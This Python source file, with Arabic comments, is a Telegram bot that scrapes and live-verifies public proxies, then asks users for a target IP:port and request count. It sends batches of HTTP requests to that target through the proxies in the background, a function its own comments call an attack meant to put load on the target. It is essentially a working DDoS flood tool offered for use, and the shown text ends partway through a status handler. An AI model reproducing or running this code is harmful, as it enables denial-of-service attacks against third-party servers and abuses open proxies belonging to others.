# -*- coding: utf-8 -*-
"""
🤖 بوت تيليجرام – استخراج ايبيات شغّالة فعلياً (متحقَّق منها حيّاً) وإرسال طلبات
════════════════════════════════════════════════════════════════
• زر «🚀 استخراج ايبيات» يطلب منك إرسال الايبي والبورت المستهدف (ويعلمك الصيغة)، 
  وعدد الطلبات. ثم يرسل لك ملف txt يحتوي على الايبيات، ويقوم البوت تلقائياً 
  بإرسال الطلبات إلى الايبي والبورت في الخلفية باستخدام هذه الايبيات.
• زر «🧪 تجربة ايبي شغّال» (جديد): يختار ايبي واحد من المخزون الشغّال ويرسل طلب
  HTTP تجريبي واحد فقط عبره إلى موقع محدَّد (TEST_URL) ليُظهر لك مباشرة أنه فعلاً
  يعمل (حالة الاستجابة + زمن الاستجابة).
• الايبيات لا تتكرر لنفس المستخدم؛ وعند انتهاء المخزون تبدأ دورة جديدة.
• آلية العمل:
    1) تُجلب قوائم ايبيات مرشَّحة من مصادر عامة (قائمة SOURCES أدناه) كل CACHE_TTL ثانية.
    2) في الخلفية، وباستمرار، يتحقق البوت من هذه المرشّحات حياً (اتصال فعلي عبر كل
       ايبي إلى TEST_URL) ويحتفظ فقط بما ينجح فعلاً ضمن "المخزون الشغّال".
    3) زرّا الاستخراج والتجربة يقرآن فقط من هذا المخزون الشغّال — لا ايبيات وهمية.
  ⚠️ ملاحظة مهمة: نطاقات CIDR الرسمية (مثل Cloudflare/Fastly) أُبقيت في القائمة
  للعرض الإحصائي فقط، ولم تعد تُستخدَم لتوليد ايبيات عشوائية ضمنها، لأن عنواناً
  عشوائياً داخل نطاق شركة ما ليس بالضرورة بروكسي شغّال — وهذا يتعارض مع هدفك
  بأن تكون الايبيات المُسلَّمة "حقيقية وشغّالة" فعلاً.

المتغيرات (GitHub ← Settings ← Secrets and variables ← Actions):
    BOT_TOKEN           إجباري    توكن البوت من @BotFather
    ALLOWED_USERS       اختياري   آيديات مسموحة مفصولة بفاصلة (فارغ = البوت للجميع)
    IPS_PER_REQUEST     اختياري   عدد الايبيات الشغّالة المستهدفة لكل سحب (افتراضي 10000)
    TEST_URL            اختياري   الموقع الذي يُستخدم للتحقق من الايبيات ولزر «تجربة ايبي»
                                  (افتراضي: http://httpbin.org/ip) — ضع هنا موقعك المحدَّد
    KEEP_PORT           اختياري   1 = IP:PORT (مطلوب فعلياً لاستخدامها كبروكسي) | 0 = IP فقط
    VERIFY_CONCURRENCY  اختياري   عدد الفحوصات المتزامنة أثناء التحقق (افتراضي 300)
    VERIFY_TIMEOUT      اختياري   مهلة كل فحص بالثواني (افتراضي 6)
    VERIFY_RECHECK      اختياري   كم ايبي "شغّال سابقاً" يُعاد فحصه كصيانة كل دورة (افتراضي 300)
    VERIFY_LOOP_INTERVAL اختياري  ثواني الانتظار بين كل دورة تحقق خلفية (افتراضي 20)
    CACHE_TTL           اختياري   كل كم ثانية تُحدَّث قوائم المصادر (افتراضي 1800)
    COOLDOWN            اختياري   ثواني الانتظار بين سحبين لنفس المستخدم (افتراضي 5)

ملاحظة تثبيت: للتحقق الفعلي من بروكسيات socks4/socks5 (وليس http/https فقط) أضف
السطر التالي إلى requirements.txt في مستودعك:
    aiohttp-socks
وإن لم تضفه، سيستمر البوت بالعمل لكنه سيتجاهل بروكسيات socks4/socks5 أثناء التحقق
(أي سيعتمد فقط على مصادر http/https الشغّالة فعلاً).
════════════════════════════════════════════════════════════════
"""
from __future__ import annotations

import asyncio
import html
import logging
import os
import random
import re
import time
from ipaddress import ip_network
from pathlib import Path
from urllib.parse import urlparse

import aiohttp
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

try:
    from aiohttp_socks import ProxyConnector, ProxyType

    HAS_SOCKS = True
except ImportError:  # aiohttp-socks غير مثبت → سيتم تجاهل socks4/socks5 أثناء التحقق
    HAS_SOCKS = False

# ══════════════════════════════ الإعدادات ══════════════════════════════


def env_int(name: str, default: int) -> int:
    try:
        return int(os.getenv(name, "").strip() or default)
    except ValueError:
        return default


BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
IPS_PER_REQUEST = env_int("IPS_PER_REQUEST", 10_000)   # الهدف: عدد الايبيات الشغّالة في كل سحب
CACHE_TTL = env_int("CACHE_TTL", 1800)                 # كل كم ثانية تُحدَّث قوائم المصادر (المرشّحين)
COOLDOWN = env_int("COOLDOWN", 5)                      # ثواني الانتظار بين سحبين لنفس المستخدم
KEEP_PORT = os.getenv("KEEP_PORT", "1") == "1"         # 1 = IP:PORT (لازم كي تُستخدم كبروكسي) | 0 = IP فقط
MAX_SOURCE_BYTES = 60 * 1024 * 1024                    # أقصى حجم يُقرأ من كل مصدر
MAX_TRACKED_USERS = 2000                               # أقصى عدد مستخدمين يُحفظ سجلّهم في الذاكرة
ALLOWED_USERS = {
    int(x)
    for x in os.getenv("ALLOWED_USERS", "").replace(" ", "").split(",")
    if x.isdigit()
}

# الموقع المعتمد للتحقق من الايبيات ولزر «تجربة ايبي شغّال» — غيّره لموقعك المحدَّد
TEST_URL = os.getenv("TEST_URL", "http://httpbin.org/ip").strip()
VERIFY_CONCURRENCY = env_int("VERIFY_CONCURRENCY", 300)    # فحوصات متزامنة
VERIFY_TIMEOUT = env_int("VERIFY_TIMEOUT", 6)              # مهلة كل فحص (ثانية)
VERIFY_RECHECK = env_int("VERIFY_RECHECK", 300)            # صيانة: إعادة فحص عيّنة ممّا كان شغّالاً
VERIFY_LOOP_INTERVAL = env_int("VERIFY_LOOP_INTERVAL", 20)  # ثواني بين كل دورة تحقق خلفية

# ══════════════════════════════ المصادر ══════════════════════════════
# كل مصدر مربوط ببروتوكوله الحقيقي (http/https/socks4/socks5) كي يُفحص بالطريقة الصحيحة.
# MIXED = لا نعرف نوع كل سطر بالضبط، فنجرّب كل الأنواع عليه عند التحقق.
# CIDR_ONLY = مصدر نطاقات فقط (ليس بروكسيات) — يُستخدم للعرض الإحصائي فقط.
_GH = "https://raw.githubusercontent.com"
MIXED = frozenset({"http", "https", "socks4", "socks5"})
CIDR_ONLY: frozenset[str] = frozenset()

SOURCES: list[tuple[str, object]] = [
    # ── قوائم ايبيات عامة (GitHub raw) ──
    (f"{_GH}/TheSpeedX/PROXY-List/master/http.txt", "http"),
    (f"{_GH}/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"),
    (f"{_GH}/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"),
    (f"{_GH}/monosans/proxy-list/main/proxies/http.txt", "http"),
    (f"{_GH}/monosans/proxy-list/main/proxies/socks4.txt", "socks4"),
    (f"{_GH}/monosans/proxy-list/main/proxies/socks5.txt", "socks5"),
    (f"{_GH}/clarketm/proxy-list/master/proxy-list-raw.txt", MIXED),
    (f"{_GH}/ShiftyTR/Proxy-List/master/http.txt", "http"),
    (f"{_GH}/ShiftyTR/Proxy-List/master/https.txt", "https"),
    (f"{_GH}/ShiftyTR/Proxy-List/master/socks4.txt", "socks4"),
    (f"{_GH}/ShiftyTR/Proxy-List/master/socks5.txt", "socks5"),
    (f"{_GH}/hookzof/socks5_list/master/proxy.txt", "socks5"),
    (f"{_GH}/jetkai/proxy-list/main/online-proxies/txt/proxies.txt", MIXED),
    (f"{_GH}/roosterkid/openproxylist/main/HTTPS_RAW.txt", "https"),
    (f"{_GH}/roosterkid/openproxylist/main/SOCKS4_RAW.txt", "socks4"),
    (f"{_GH}/roosterkid/openproxylist/main/SOCKS5_RAW.txt", "socks5"),
    (f"{_GH}/MuRongPIG/Proxy-Master/main/http.txt", "http"),
    (f"{_GH}/MuRongPIG/Proxy-Master/main/socks4.txt", "socks4"),
    (f"{_GH}/MuRongPIG/Proxy-Master/main/socks5.txt", "socks5"),
    (f"{_GH}/mmpx12/proxy-list/master/http.txt", "http"),
    (f"{_GH}/mmpx12/proxy-list/master/https.txt", "https"),
    (f"{_GH}/mmpx12/proxy-list/master/socks4.txt", "socks4"),
    (f"{_GH}/mmpx12/proxy-list/master/socks5.txt", "socks5"),
    (f"{_GH}/Zaeem20/FREE_PROXIES_LIST/master/http.txt", "http"),
    (f"{_GH}/Zaeem20/FREE_PROXIES_LIST/master/https.txt", "https"),
    (f"{_GH}/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt", "socks4"),
    (f"{_GH}/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt", "socks5"),
    (f"{_GH}/ErcinDedeoglu/proxies/main/proxies/http.txt", "http"),
    (f"{_GH}/ErcinDedeoglu/proxies/main/proxies/https.txt", "https"),
    (f"{_GH}/ErcinDedeoglu/proxies/main/proxies/socks4.txt", "socks4"),
    (f"{_GH}/ErcinDedeoglu/proxies/main/proxies/socks5.txt", "socks5"),
    (f"{_GH}/proxifly/free-proxy-list/main/proxies/all/data.txt", MIXED),
    (f"{_GH}/sunny9577/proxy-scraper/master/proxies.txt", MIXED),
    (f"{_GH}/vakhov/fresh-proxy-list/master/http.txt", "http"),
    (f"{_GH}/vakhov/fresh-proxy-list/master/socks4.txt", "socks4"),
    (f"{_GH}/vakhov/fresh-proxy-list/master/socks5.txt", "socks5"),
    (f"{_GH}/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt", "http"),
    (f"{_GH}/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt", "socks4"),
    (f"{_GH}/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt", "socks5"),
    # ── واجهات API عامة ──
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all", "http"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all", "socks4"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all", "socks5"),
    ("https://spys.me/proxy.txt", MIXED),
    # ── نطاقات CIDR رسمية: للعرض الإحصائي فقط (لا تُستخدم كبروكسيات) ──
    ("https://www.cloudflare.com/ips-v4", CIDR_ONLY),
    ("https://api.fastly.com/public-ip-list", CIDR_ONLY),
    # ── أضف مصادرك هنا 👇 (الرابط, البروتوكول: "http"/"https"/"socks4"/"socks5"/MIXED) ──
    # ("https://example.com/my-big-ip-list.txt", MIXED),
]

HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; IPExtractorBot/1.0)"}

# ══════════════════════════════ السجلات ══════════════════════════════
logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
for _noisy in ("httpx", "httpcore"):          # httpx يطبع رابط الطلب وفيه التوكن
    logging.getLogger(_noisy).setLevel(logging.WARNING)
log = logging.getLogger("ipbot")
if not HAS_SOCKS:
    log.warning(
        "⚠️ aiohttp-socks غير مثبت: سيتم تجاهل بروكسيات socks4/socks5 أثناء التحقق. "
        "أضف aiohttp-socks إلى requirements.txt لتفعيلها."
    )

# ══════════════════════════════ التحليل ══════════════════════════════
_OCTET = r"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
# يلتقط: IP  |  IP:PORT  |  IP/MASK
IP_RE = re.compile(
    rf"(?<![\d.])({_OCTET}(?:\.{_OCTET}){{3}})(?:/(\d{{1,2}})|:(\d{{1,5}}))?(?![\d.])"
)


def is_public(ip: str) -> bool:
    """يستبعد الايبيات الخاصة والمحجوزة (محلية، شبكات داخلية، multicast...)."""
    a, b = (int(x) for x in ip.split(".")[:2])
    if a in (0, 10, 127) or a >= 224:
        return False
    if (a == 169 and b == 254) or (a == 172 and 16 <= b <= 31) or (a == 192 and b == 168):
        return False
    if a == 100 and 64 <= b <= 127:
        return False
    return True


def _protos(p: object) -> frozenset[str]:
    return frozenset({p}) if isinstance(p, str) else p  # type: ignore[return-value]


def parse_text(text: str, proto: object) -> tuple[dict[str, frozenset[str]], set[str]]:
    """يستخرج من نص مصدر واحد: (مرشّحو ip:port مع بروتوكولهم المحتمل، نطاقات CIDR).
    ايبي بلا بورت يُستبعد من المرشّحين لأنه عديم الفائدة كبروكسي فعلي."""
    protos = _protos(proto)
    found: dict[str, set[str]] = {}
    cidrs: set[str] = set()
    for ip, mask, port in IP_RE.findall(text):
        if mask:
            if int(mask) <= 32:
                cidrs.add(f"{ip}/{mask}")
            continue
        if not protos:                       # مصدر CIDR_ONLY فقط → لا نجمع ايبيات مفردة منه
            continue
        if not is_public(ip):
            continue
        if not port or not (0 < int(port) < 65536):
            continue
        key = f"{ip}:{port}"
        found.setdefault(key, set()).update(protos)
    return {k: frozenset(v) for k, v in found.items()}, cidrs


def sample_ranges(cidrs: set[str], k: int) -> tuple[set[str], int]:
    """يحسب الحجم الإجمالي لنطاقات CIDR (للعرض فقط)، ويولّد k ايبي عشوائي منها إن طُلب."""
    nets = []
    for c in cidrs:
        try:
            nets.append(ip_network(c, strict=False))
        except ValueError:
            continue
    if not nets:
        return set(), 0
    weights = [n.num_addresses for n in nets]
    total = sum(weights)
    out: set[str] = set()
    if k > 0:
        for net in random.choices(nets, weights=weights, k=k):
            ip = str(net.network_address + random.randrange(net.num_addresses))
            if is_public(ip):
                out.add(ip)
    return out, total


def load_local_files() -> list[tuple[str, str]]:
    folder = Path(__file__).resolve().parent / "sources"
    files: list[tuple[str, str]] = []
    if folder.is_dir():
        for p in sorted(folder.glob("*.txt")):
            try:
                files.append((f"📁 {p.name}", p.read_text(encoding="utf-8", errors="ignore")))
            except OSError as exc:
                log.warning("تعذّرت قراءة %s: %s", p.name, exc)
    return files


def build_pool(fetched: list[tuple[str, object, str | None]]):
    """يدمج كل المصادر إلى قائمة مرشّحين (ip:port + بروتوكولاتهم المحتملة).
    يعمل داخل thread كي لا يوقف البوت أثناء المعالجة."""
    all_candidates: dict[str, set[str]] = {}
    all_cidrs: set[str] = set()
    stats: dict[str, int] = {}
    local_as_sources = [(n, MIXED, t) for n, t in load_local_files()]
    for name, proto, text in [*fetched, *local_as_sources]:
        if not text:
            stats[name] = 0
            continue
        found, cidrs = parse_text(text, proto)
        for k, protos in found.items():
            all_candidates.setdefault(k, set()).update(protos)
        all_cidrs |= cidrs
        stats[name] = len(found) + len(cidrs)
    _, range_total = sample_ranges(all_cidrs, 0)   # فقط لمعرفة حجم المدى الإجمالي، بدون توليد ايبيات وهمية
    return all_candidates, range_total, stats


def short_name(src: str) -> str:
    if not src.startswith("http"):
        return src
    u = urlparse(src)
    parts = [p for p in u.path.split("/") if p]
    if u.netloc == "raw.githubusercontent.com" and len(parts) >= 3:
        return f"{parts[0]}/{parts[1]}/{parts[-1]}"
    name = f"{u.netloc}/{parts[-1]}" if parts else u.netloc
    for kv in u.query.split("&"):                 # يميّز روابط API المتشابهة (protocol=http ...)
        if kv.startswith("protocol="):
            name += "?" + kv
    return name


async def fetch_text(session: aiohttp.ClientSession, url: str) -> str:
    async with session.get(url) as resp:
        resp.raise_for_status()
        buf = bytearray()
        async for chunk in resp.content.iter_chunked(256 * 1024):
            buf.extend(chunk)
            if len(buf) > MAX_SOURCE_BYTES:
                break
        return buf.decode("utf-8", errors="ignore")


def format_ip(ip_port: str) -> str:
    return ip_port if KEEP_PORT else ip_port.split(":", 1)[0]


# ══════════════════════════════ التحقق الحي من الايبيات ══════════════════════════════
async def _probe(host: str, port: str, proto: str, timeout: aiohttp.ClientTimeout) -> tuple[bool, float]:
    """يرسل طلب HTTP واحد فعلي عبر هذا الايبي إلى TEST_URL ويرجع (نجح؟, زمن الاستجابة)."""
    start = time.monotonic()
    try:
        if proto in ("http", "https"):
            async with aiohttp.ClientSession(timeout=timeout, headers=HEADERS) as s:
                async with s.get(TEST_URL, proxy=f"http://{host}:{port}") as r:
                    await r.read()
                    return r.status < 500, time.monotonic() - start
        elif proto in ("socks4", "socks5"):
            if not HAS_SOCKS:
                return False, 0.0
            ptype = ProxyType.SOCKS4 if proto == "socks4" else ProxyType.SOCKS5
            connector = ProxyConnector(proxy_type=ptype, host=host, port=int(port))
            async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=HEADERS) as s:
                async with s.get(TEST_URL) as r:
                    await r.read()
                    return r.status < 500, time.monotonic() - start
    except Exception:  # noqa: BLE001
        pass
    return False, 0.0


# ══════════════════════════════ مخزون الايبيات ══════════════════════════════
class IPPool:
    def __init__(self) -> None:
        self.candidates: dict[str, frozenset[str]] = {}    # "ip:port" → بروتوكولات محتملة
        self.verified: dict[str, tuple[str, float]] = {}   # "ip:port" → (بروتوكول شغّال فعلاً, زمن الاستجابة)
        self.range_total = 0
        self.stats: dict[str, int] = {}
        self.updated = 0.0
        self.history: dict[int, set[str]] = {}              # user_id → ايبيات استلمها سابقاً
        self._lock: asyncio.Lock | None = None
        self._verifying = False

    def _fresh(self) -> bool:
        return bool(self.candidates) and (time.monotonic() - self.updated) < CACHE_TTL

    async def ensure_fresh(self) -> None:
        if self._fresh():
            return
        if self._lock is None:
            self._lock = asyncio.Lock()
        async with self._lock:
            if not self._fresh():
                await self._refresh()

    async def _refresh(self) -> None:
        log.info("🔄 تحديث المصادر (%d رابط)...", len(SOURCES))
        sem = asyncio.Semaphore(10)
        timeout = aiohttp.ClientTimeout(total=60, connect=15)

        async with aiohttp.ClientSession(timeout=timeout, headers=HEADERS) as session:

            async def job(url: str, proto: object):
                async with sem:
                    try:
                        return url, proto, await fetch_text(session, url)
                    except Exception as exc:  # noqa: BLE001
                        log.warning("✗ %s → %s", short_name(url), type(exc).__name__)
                        return url, proto, None

            fetched = await asyncio.gather(*(job(u, p) for u, p in SOURCES))

        candidates, range_total, stats = await asyncio.to_thread(build_pool, list(fetched))
        self.stats = stats
        if not candidates:
            log.error("لم يتم تحميل أي ايبي من أي مصدر!")
            return
        self.commit(candidates, range_total)

    def commit(self, candidates: dict[str, set[str]], range_total: int) -> None:
        self.candidates = {k: frozenset(v) for k, v in candidates.items()}
        self.range_total = range_total
        self.updated = time.monotonic()
        log.info("✅ مرشّحون جاهزون للتحقق: %d (شغّال فعلاً حالياً: %d)", len(self.candidates), len(self.verified))

    async def verify_pool(self, target: int, max_new_checks: int | None = None) -> None:
        """يتحقق حيّاً من المرشّحين حتى يصل عدد الشغّالين فعلاً إلى target، ويعيد فحص
        عيّنة ممّا كان شغّالاً سابقاً (صيانة) لأن بعض البروكسيات المجانية تتوقف بسرعة."""
        if self._verifying or not self.candidates:
            return
        self._verifying = True
        try:
            timeout = aiohttp.ClientTimeout(total=VERIFY_TIMEOUT)

            async def probe_and_store(ip_port: str) -> None:
                host, port = ip_port.rsplit(":", 1)
                for proto in self.candidates.get(ip_port, ()):
                    ok, latency = await _probe(host, port, proto, timeout)
                    if ok:
                        self.verified[ip_port] = (proto, latency)
                        return
                self.verified.pop(ip_port, None)

            # 1) صيانة: أعد فحص عيّنة ممّا تحقّقنا منه سابقاً (قد يكون توقف الآن)
            recheck = random.sample(list(self.verified), min(len(self.verified), VERIFY_RECHECK))
            for i in range(0, len(recheck), VERIFY_CONCURRENCY):
                chunk = recheck[i : i + VERIFY_CONCURRENCY]
                await asyncio.gather(*(probe_and_store(ip) for ip in chunk))

            # 2) نمو: افحص مرشّحين جدد حتى نصل للهدف
            new_candidates = [ip for ip in self.candidates if ip not in self.verified]
            random.shuffle(new_candidates)
            if max_new_checks is not None:
                new_candidates = new_candidates[:max_new_checks]

            checked = 0
            for i in range(0, len(new_candidates), VERIFY_CONCURRENCY):
                if len(self.verified) >= target:
                    break
                chunk = new_candidates[i : i + VERIFY_CONCURRENCY]
                await asyncio.gather(*(probe_and_store(ip) for ip in chunk))
                checked += len(chunk)

            log.info(
                "🔎 شغّال فعلاً الآن: %d / هدف %d (فُحص %d مرشّح جديد من أصل %d متاح)",
                len(self.verified), target, checked, len(new_candidates),
            )
        finally:
            self._verifying = False

    def draw(self, user_id: int, n: int) -> tuple[list[str], bool, int]:
        """يسحب حتى n ايبي شغّال فعلاً لم يستلمها هذا المستخدم من قبل.
        يرجع (الايبيات، بدأت دورة جديدة؟، المتبقي)."""
        if user_id not in self.history and len(self.history) >= MAX_TRACKED_USERS:
            self.history.pop(next(iter(self.history)))
        seen = self.history.setdefault(user_id, set())

        pool = list(self.verified.keys())
        fresh = [ip for ip in pool if ip not in seen]
        reset = False
        if len(fresh) < n and seen:               # لم يتبق ما يكفي → دورة جديدة
            seen.clear()
            fresh = pool
            reset = True

        picked = random.sample(fresh, min(n, len(fresh)))
        seen.update(picked)
        return picked, reset, len(pool) - len(seen)


async def test_single_ip() -> tuple[str, str, bool, float] | None:
    """يختار ايبي شغّال عشوائياً من المخزون، ويرسل له طلب تجربة حي واحد فقط
    إلى TEST_URL (نفس الموقع المحدَّد) للتأكد أنه ما زال يعمل الآن بالضبط."""
    if not POOL.verified:
        return None
    ip_port, (proto, _old_latency) = random.choice(list(POOL.verified.items()))
    timeout = aiohttp.ClientTimeout(total=VERIFY_TIMEOUT)
    host, port = ip_port.rsplit(":", 1)
    ok, latency = await _probe(host, port, proto, timeout)
    if not ok:
        POOL.verified.pop(ip_port, None)           # توقف الآن → استبعده فوراً
    return ip_port, proto, ok, latency


POOL = IPPool()
LAST_USE: dict[int, float] = {}
BUSY: set[int] = set()
_BG_TASKS: set[asyncio.Task] = set()

# ══════════════════════════════ الإرسال والهجوم ══════════════════════════════
async def flood_target(target_ip: str, target_port: str, proxies: list[str]) -> None:
    """يقوم بإرسال طلبات للايبي والبورت المستهدفين باستخدام الايبيات (البروكسيات) في الخلفية."""
    timeout = aiohttp.ClientTimeout(total=10)
    target_url = f"http://{target_ip}:{target_port}/"
    
    async def send_req(proxy_ip_port):
        try:
            host, port = proxy_ip_port.rsplit(":", 1)
            proto = POOL.verified.get(proxy_ip_port, ("http", 0))[0]
            
            if proto in ("http", "https"):
                async with aiohttp.ClientSession(timeout=timeout, headers=HEADERS) as s:
                    async with s.get(target_url, proxy=f"http://{host}:{port}") as r:
                        await r.read()
            elif proto in ("socks4", "socks5") and HAS_SOCKS:
                ptype = ProxyType.SOCKS4 if proto == "socks4" else ProxyType.SOCKS5
                connector = ProxyConnector(proxy_type=ptype, host=host, port=int(port))
                async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=HEADERS) as s:
                    async with s.get(target_url) as r:
                        await r.read()
        except Exception:
            pass

    # إرسال الطلبات بشكل متزامن على شكل دفعات لتوليد ضغط (طلبات) على الهدف
    chunk_size = 200
    for i in range(0, len(proxies), chunk_size):
        chunk = proxies[i:i+chunk_size]
        await asyncio.gather(*(send_req(p) for p in chunk))


# ══════════════════════════════ الواجهة ══════════════════════════════
WELCOME = (
    "أهلاً <b>{name}</b> 👋\n\n"
    "🌐 <b>بوت استخراج الايبيات وإرسال الطلبات</b>\n"
    "اضغط «استخراج» لتحديد الايبي والبورت الذي تريد استهدافه وإرسال الطلبات له. "
    "سيصلك ملف بالايبيات وسيقوم البوت تلقائياً بإرسال الطلبات للهدف في الخلفية.\n"
    "أو جرّب زر «🧪 تجربة ايبي شغّال» لترى ايبياً واحداً وهو يرسل طلباً حقيقياً "
    "أمامك مباشرة."
)


def main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🚀 استخراج وإرسال طلبات", callback_data="extract")],
            [InlineKeyboardButton("🧪 تجربة ايبي شغّال", callback_data="test")],
            [InlineKeyboardButton("📊 حالة المصادر", callback_data="status")],
        ]
    )


async def safe_edit(query, text: str, markup: InlineKeyboardMarkup | None = None) -> None:
    try:
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
    except BadRequest as exc:
        if "not modified" not in str(exc).lower():
            log.warning("تعذّر تعديل الرسالة: %s", exc)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if ALLOWED_USERS and user.id not in ALLOWED_USERS:
        await update.effective_message.reply_text("⛔ هذا البوت خاص.")
        return
    context.user_data.clear()
    await update.effective_message.reply_text(
        WELCOME.format(name=html.escape(user.first_name or "")),
        reply_markup=main_menu(),
        parse_mode=ParseMode.HTML,
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """يلتقط ردود المستخدم (الايبي، البورت، والعدد) بناءً على المرحلة."""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        return
    
    state = context.user_data.get('state')
    
    if state == 'WAIT_TARGET':
        text = update.message.text.strip()
        if ':' not in text:
            await update.message.reply_text(
                "❌ صيغة خاطئة!\n"
                "الرجاء إرسال الايبي والبورت معاً وبينهما نقطتين رأسيتين (<code>:</code>).\n\n"
                "📌 <b>مثال صحيح:</b>\n<code>1.1.1.1:80</code>", 
                parse_mode=ParseMode.HTML
            )
            return
        
        target_ip, target_port = text.split(':', 1)
        if not target_port.isdigit():
            await update.message.reply_text("❌ البورت يجب أن يكون أرقاماً فقط.")
            return
            
        context.user_data['target_ip'] = target_ip
        context.user_data['target_port'] = target_port
        context.user_data['state'] = 'WAIT_COUNT'
        await update.message.reply_text("كم عدد الطلبات (الايبيات) التي تريد إرسالها للهدف؟ (مثال: 1000)")
        
    elif state == 'WAIT_COUNT':
        text = update.message.text.strip()
        if not text.isdigit():
            await update.message.reply_text("❌ الرجاء إرسال رقم صحيح.")
            return
        count = int(text)
        if count <= 0:
            await update.message.reply_text("❌ الرجاء إرسال رقم أكبر من الصفر.")
            return
            
        context.user_data['state'] = None
        target_ip = context.user_data.get('target_ip')
        target_port = context.user_data.get('target_port')
        await process_extraction(update, context, target_ip, target_port, count)


async def process_extraction(update: Update, context: ContextTypes.DEFAULT_TYPE, target_ip: str, target_port: str, requested_count: int) -> None:
    uid = update.effective_user.id
    now = time.monotonic()

    if uid in BUSY:
        await update.message.reply_text("⏳ جارِ تجهيز طلبك السابق...")
        return
    wait = COOLDOWN - (now - LAST_USE.get(uid, -1e9))
    if wait > 0:
        await update.message.reply_text(f"⏳ انتظر {int(wait) + 1} ثانية")
        return

    BUSY.add(uid)
    LAST_USE[uid] = now
    try:
        msg = await update.message.reply_text("⏳ <b>جارِ استخراج الايبيات...</b>", parse_mode=ParseMode.HTML)
        await POOL.ensure_fresh()
        if not POOL.verified:
            await msg.edit_text(
                "⚠️ لم يكتمل التحقق من أي ايبي حتى الآن.\n"
                "البوت يتحقق في الخلفية باستمرار — حاول خلال دقيقة.",
                reply_markup=main_menu()
            )
            return

        ips, reset, remaining = POOL.draw(uid, requested_count)
        lines = sorted({format_ip(ip) for ip in ips})
        
        # إضافة الايبي والبورت كملاحظة في رأس الملف
        file_content = f"# الهدف المستهدف: {target_ip}:{target_port}\n# عدد الطلبات (الايبيات): {len(lines)}\n\n" + "\n".join(lines)

        caption = [
            f"✅ <b>تم استخراج {len(lines):,} ايبي</b>",
            f"🎯 <b>الهدف:</b> <code>{target_ip}:{target_port}</code>",
            f"🔥 <b>البوت يقوم الآن بإرسال الطلبات للهدف في الخلفية!</b>",
            f"🔒 المتبقي لك بدون تكرار: {remaining:,}",
            f"🗂 إجمالي المخزون الشغّال حالياً: {len(POOL.verified):,}",
        ]
        if len(POOL.verified) < requested_count:
            caption.append(
                f"ℹ️ العدد الشغّال فعلياً الآن أقل من المطلوب ({requested_count:,})، "
                "والبوت يواصل التحقق من المزيد في الخلفية تلقائياً."
            )
        if reset:
            caption.append("♻️ انتهت الايبيات الجديدة فبدأت دورة جديدة.")

        await context.bot.send_document(
            chat_id=update.message.chat_id,
            document=file_content.encode("utf-8"),
            filename=time.strftime("ips_%Y%m%d_%H%M%S.txt"),
            caption="\n".join(caption),
            parse_mode=ParseMode.HTML,
        )
        
        await msg.delete() # حذف رسالة الانتظار لترتيب المحادثة
        
        # إطلاق مهمة الإرسال (الهجوم) في الخلفية لكي لا يتوقف البوت
        asyncio.create_task(flood_target(target_ip, target_port, ips))

    except Exception:  # noqa: BLE001
        log.exception("فشل الاستخراج")
        await update.message.reply_text("❌ حدث خطأ، حاول مرة أخرى.", reply_markup=main_menu())
    finally:
        BUSY.discard(uid)


async def do_test(query) -> None:
    """النافذة الجديدة: ترسل ايبي واحد شغّال كطلب حقيقي إلى الموقع المحدَّد (TEST_URL) فقط،
    لإثبات أنه يعمل فعلاً."""
    await query.answer()
    await safe_edit(query, "🧪 <b>جارِ اختبار ايبي واحد شغّال...</b>")
    await POOL.ensure_fresh()
    if not POOL.verified:
        await safe_edit(
            query,
            "⚠️ لا يوجد حالياً أي ايبي متحقَّق منه ليُختبر.\nحاول خلال دقيقة.",
            main_menu(),
        )
        return

    result = await test_single_ip()
    if result is None:
        await safe_edit(query, "⚠️ تعذّر اختيار ايبي، حاول مرة أخرى.", main_menu())
        return

    ip_port, proto, ok, latency = result
    if ok:
        text = (
            "✅ <b>الايبي شغّال فعلاً!</b>\n\n"
            f"🌐 الايبي: <code>{html.escape(ip_port)}</code>\n"
            f"🔌 النوع: <b>{html.escape(proto)}</b>\n"
            f"🎯 أُرسل طلب تجربة واحد فقط عبره إلى:\n<code>{html.escape(TEST_URL)}</code>\n"
            f"⏱ زمن الاستجابة: <b>{latency:.2f} ثانية</b>"
        )
    else:
        text = (
            "❌ <b>هذا الايبي توقف الآن بالذات</b>\n\n"
            f"🌐 الايبي: <code>{html.escape(ip_port)}</code>\n"
            "البروكسيات المجانية تتوقف بسرعة — تم استبعاده تلقائياً، اضغط الزر مرة أخرى لتجربة ايبي آخر."
        )
    await safe_edit(query, text, main_menu())


async def do_status(query) -> None:
    await query.answer()
    await POOL.ensure_fresh()
    ok = sum(1 for c in POOL.stats.values() if c)
    bad = [short_name(n) for n, c in POOL.stats.items() if not c]
    age = int((time.monotonic() - POOL.updated) // 60) if POOL.updated else 0

    lines = [
        "📊 <b>حالة المصادر</b>",
        "",
        f"✅ مصادر شغالة: <b>{ok}</b> من {len(POOL.stats)}",
